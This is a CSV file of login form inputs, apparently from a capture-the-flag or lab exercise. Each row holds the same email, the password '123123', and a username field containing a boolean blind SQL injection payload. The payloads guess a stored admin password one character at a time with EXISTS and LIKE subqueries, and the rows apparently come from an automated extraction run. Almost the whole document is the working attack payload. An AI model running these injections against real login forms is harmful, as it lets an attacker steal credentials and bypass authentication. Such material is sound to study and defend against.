email,username,password
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsE%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsF%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsG%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsH%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsI%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsJ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsK%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsL%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsM%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsN%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsO%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsP%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsQ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsR%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsS%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATst%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsu%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsv%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsw%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsx%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsy%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATsz%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATU%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATV%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATW%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATX%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATY%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrATZ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrs%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrt%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgru%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrv%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrw%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrx%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgry%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNgrz%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNO%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNP%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNQ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNR%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNS%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNT%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNU%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNV%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNW%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNX%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNY%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoNZ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcop%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoq%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcor%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcos%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcot%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcou%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcov%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcow%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcox%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoy%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNcoz%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNO%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNP%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNQ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNR%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNS%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNT%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNU%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNV%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNW%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNX%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNY%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioNZ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTiop%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioq%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTior%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTios%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTiot%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTiou%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTiov%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTiow%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTiox%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioy%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTioz%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTU%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTV%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTW%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTX%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTY%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeCTZ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJef%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeg%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeh%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJei%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJej%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJek%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJel%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJem%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJen%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJeo%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'ad%' and password like 'goOdinJep%')#,123123
